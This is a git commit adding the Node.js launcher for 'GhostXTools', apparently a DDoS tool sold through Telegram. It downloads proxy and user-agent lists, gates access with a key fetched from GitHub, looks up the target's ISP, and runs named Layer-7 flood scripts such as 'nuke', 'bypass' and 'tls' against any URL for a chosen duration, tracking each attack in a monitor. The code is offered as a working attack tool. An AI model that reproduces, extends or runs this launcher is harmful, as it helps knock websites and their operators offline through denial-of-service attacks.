e98e6cf7e4190a0a135f70eb705a0711eef3c554
maboktuak1222 <ayamtenggen25@gmail.com>
2024-12-21 11:28:12 +0700

    Add files via upload

---
+++ index.js
@@ -0,0 +1,316 @@
+#!/usr/bin/env node
+
+const { exec, spawn  } = require('child_process')
+const readline = require('readline')
+const url = require('url')
+const fs = require('fs')
+const axios = require('axios')
+const path = require('path')
+const version = '9.2.0'
+let processList = [];
+const cyan = '\x1b[96m'
+const bold = '\x1b[1m';
+const back_putih = '\x1b[48;5;255m';
+const teksmerah = '\x1b[31m';
+const Reset = '\x1b[0m';
+const biru = '\x1b[36m'
+const hijau = '\x1b[38;2;144;238;144m'
+
+const permen = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+})
+// [========================================] //
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+// [========================================] //
+async function banner() {
+console.clear()
+console.log(`
+${hijau}[ SYSTEM ]${Reset} Welcome To GhostXTools
+\x1b[31m⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣖⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[31m
+\x1b[31m⠀⠀⠀⠀⢀⣾⡟⣉⣽⣿⢿⡿⣿⣿⣆⠀⠀⠀⠀⠀⠀ \x1b[0m
+\x1b[31m⠀⠀⠀⢠⣿⣿⣿⡗⠋⠙⡿⣷⢌⣿⣿⠀⠀⠀⠀⠀⠀⠀\x1b[0m
+\x1b[31m⣷⣄⣀⣿⣿⣿⣿⣷⣦⣤⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀\x1b[0m
+\x1b[31m⠈⠙⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⢀⠀⠀⠀⠀\x1b[0m
+⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⠿⠿⠋⠀⠀⠀⠀
+⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⡄
+⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⢀⡾⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣷⣶⣴⣾⠏⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠋⠁⠀⠀⠀⠀
+| ${biru}GhostXTools${Reset} ${version} | ${biru}Xlamper${Reset} | 
+| t.me/GhostXTools | Owner Xlamper
+| Tools DDoS | ${biru}Not Plans C2${Reset}
+========================================================================
+Please Type "${teksmerah}help${Reset}" Or "${teksmerah}methods${Reset}"For Showing All Available Command`)}
+// [========================================] //
+async function scrapeProxy() {
+  try {
+    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
+    const data = await response.text();
+    fs.writeFileSync('proxy.txt', data, 'utf-8');
+  } catch (error) {
+    console.error(`Error fetching data: ${error.message}`);
+  }
+}
+// [========================================] //
+async function scrapeUserAgent() {
+  try {
+    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
+    const data = await response.text();
+    fs.writeFileSync('ua.txt', data, 'utf-8');
+  } catch (error) {
+    console.error(`Error fetching data: ${error.message}`);
+  }
+}
+// [========================================] //
+function clearProxy() {
+  if (fs.existsSync('proxy.txt')) {
+    fs.unlinkSync('proxy.txt');
+  }
+}
+// [========================================] //
+function clearUserAgent() {
+  if (fs.existsSync('ua.txt')) {
+    fs.unlinkSync('ua.txt');
+  }
+}
+// [========================================] //
+async function bootup() {
+  try {
+    console.log(`|| ▓░░░░░░░░░ || 10%`);
+    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
+    console.log(`|| ▓▓░░░░░░░░ || 20%`);
+    const getLatestVersion = await fetch('https://raw.githubusercontent.com/Xlamper/9.2.0/refs/heads/main/version.txt');
+    const latestVersion = await getLatestVersion.text()
+    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
+    if (version === latestVersion.trim()) {
+    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
+    
+    const secretBangetJir = await fetch('https://raw.githubusercontent.com/Xlamper/9.2.0/refs/heads/main/command.txt');
+    const password = await secretBangetJir.text();
+    await console.log(`Login Key Required`)
+    permen.question('\x1b[38;2;144;238;144mGhostXTools Security\x1b[0m]: \n', async (skibidi) => {
+      if (skibidi === password.trim()) {
+        console.log(`Successfuly Logged`)
+        await scrapeProxy()
+        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
+        await scrapeUserAgent()
+        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
+        await sleep(700)
+        console.clear()
+        console.log(`${hijau}[ SYSTEM ]${Reset} Welcome Beck Di Tools Xlamper`)
+        await sleep(1000)
+		    await banner()
+        console.log(``)
+        sigma()
+      } else {
+        console.log(`Wrong Key`)
+        process.exit(-1);
+      }
+    }) 
+  } else {
+      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
+      console.log(`Waiting Auto Update...`)
+      await exec(`npm uninstall -g prmnmd-tuls`)
+      console.log(`Installing update`)
+      await exec(`npm i -g prmnmd-tuls`)
+      console.log(`Restart Tools Please`)
+      process.exit()
+    }
+  } catch (error) {
+    console.log(`Are You Online?`)
+  }
+}
+// [========================================] //
+async function pushMonitor(target, methods, duration) {
+  const startTime = Date.now();
+  processList.push({ target, methods, startTime, duration })
+  setTimeout(() => {
+    const index = processList.findIndex((p) => p.methods === methods);
+    if (index !== -1) {
+      processList.splice(index, 1);
+    }
+  }, duration * 1000);
+}
+// [========================================] //
+function monitorAttack() {
+  console.log("\nMonitor Attack:\n");
+  processList.forEach((process) => {
+console.log(`Target: ${process.target}
+Methods: ${process.methods}
+Duration: ${process.duration} Seconds
+Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
+  });
+}
+// [========================================] //
+async function handleAttackCommand(args) {
+  if (args.length < 3) {
+    console.log(`Example: attack <url> <duration> <methods>
+attack https://google.com 120 flood`);
+    sigma();
+	return
+  }
+const [target, duration, methods] = args
+try {
+const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
+
+console.log(`
+${hijau}[ SYSTEM ]${Reset} THE ATTACK BEGINS
+${teksmerah}∆Attack Information:${Reset}
+Target   : [ ${target} ]
+Duration  : [ ${duration} ]
+Methods  : [ ${methods} ]
+
+∆Target Detail:
+AS       : [ ${result.as} ]
+Ip       : [ ${result.query} ]
+ISP      : [ ${result.isp} ]
+
+${back_putih}${biru}∆Credits${Reset}
+[ Xlamper ]
+[ t.me/Xlamper1 ]
+`)
+} catch (error) {
+  console.log(`Oops Something Went wrong`)
+}
+const metode = path.join(__dirname, `/lib/cache/${methods}`);
+ if (methods === 'nuke') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'raw') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'tlsv2') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'hold') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'bypass') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'tlsv2') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'pidoras') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'pluto') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'https') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'tls') {
+       pushMonitor(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'tls') {
+       pushMonitor(target, methods, duration)
+const uam = path.join(__dirname, `/lib/cache/uam`);
+const bypass = path.join(__dirname, `/lib/cache/bypass`);
+const pidoras = path.join(__dirname, `/lib/cache/pidoras`);
+        exec(`node ${pidoras} ${target} ${duration} 100 1 proxy.txt`)
+        exec(`node ${bypass} ${target} ${duration} 100 10 proxy.txt`)
+        exec(`node ${uam} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else {
+    console.log(`Method ${methods} not recognized.`);
+  }
+};
+// [========================================] //
+async function sigma() {
+const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
+const latestNews = await getNews.text();
+const creatorCredits = `
+Created And Coded Full By PermenMd And Xlamper
+
+Thx To:
+Allah SWT
+ChatGPT ( Fixing Error )
+PermenMD ( Provide Base Script )
+Member And User ( Ga Buat Yang Dapet Gratis )
+My Family
+PLN Dan Wifi
+Github
+YouTube ( Music )
+`
+
+permen.question(`${back_putih}${biru}Xlamper-DDoS${Reset}➔ ${back_putih}${biru}Console${Reset} ${back_putih}${biru}►${Reset} `, (input) => {
+  const [command, ...args] = input.trim().split(/\s+/);
+
+  if (command === 'help') {
+    console.log(`
+ATTACK  | Launch DDoS Attack
+CREDITS │ Show Creator Of These Tools
+CLS     │ Clear Terminal
+METHODS │ Show Methods
+`);
+    sigma();
+  } else if (command === 'methods') {
+    console.log(`
+NAME       │ DESCRIPTION                   │ DURATION
+___________│_______________________________│____________
+TLS        │ Layer7 - Attack Url           │ Unlimited 
+BYPASS     │ Layer7 - Attack Url           │ Unlimited 
+HOLD       │ Layer7 - Attack Url           │ Unlimited 
+TLSV2      │ Layer7 - Attack Url           │ Unlimited 
+HTTPS      │ Layer7 - Attack Url           │ Unlimited 
+PLUTO      │ Layer7 - Attack Url           │ Unlimited 
+NUKE       │ Layer7 - Attack Url           │ Unlimited 
+PIDORAS    │ Layer7 - Attack Url           │ Unlimited
+RAW        │ Layer7 - Attack Url           │ Unlimited
+CLS        │ Clear Terminal                │ 0
+ATTACK     │ Launch DDoS Attack            │ 0
+`);
+    sigma();
+  } else if (command === 'credits') {
+    console.log(`
+${creatorCredits}`);
+    sigma();
+  } else if (command === 'attack') {
+    handleAttackCommand(args);
+  } else if (command === 'monitor') {
+    monitorAttack()
+    sigma()
+  } else if (command === 'cls') {
+    banner()
+    sigma()
+    } else {
+    console.log(`${command} Not Found`);
+    sigma();
+  }
+});
+}
+// [========================================] //
+function clearall() {
+  clearProxy()
+  clearUserAgent()
+}
+// [========================================] //
+process.on('exit', clearall);
+process.on('SIGINT', () => {
+  clearall()
+  process.exit();
+});
+process.on('SIGTERM', () => {
+clearall()
+ process.exit();
+});
+
+bootup()
